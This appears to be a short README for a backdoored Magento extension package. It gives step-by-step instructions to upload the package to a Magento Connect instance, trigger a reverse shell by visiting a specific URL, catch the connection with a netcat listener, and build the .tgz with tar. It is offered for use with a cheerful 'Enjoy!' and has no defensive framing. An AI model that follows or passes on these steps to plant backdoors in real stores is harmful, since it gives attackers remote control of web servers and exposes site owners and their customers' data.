A simple backdoor'ed Magento package.

Upload the lavalamp_magento_bd.tgz file to a Magento Connect instance and then navigate to <magento host>/index.php/lavalamp/index. This will active the reverse shell. Make sure you listening for the connection using netcat. --> nc -lvp PORT

do the following to create a working .tgz package file:

    cd Backdoor\ Code
    tar -czvf reverse.tgz app package.xml skin
    mv reverse.tgz ~/$user/Desktop

Enjoy!
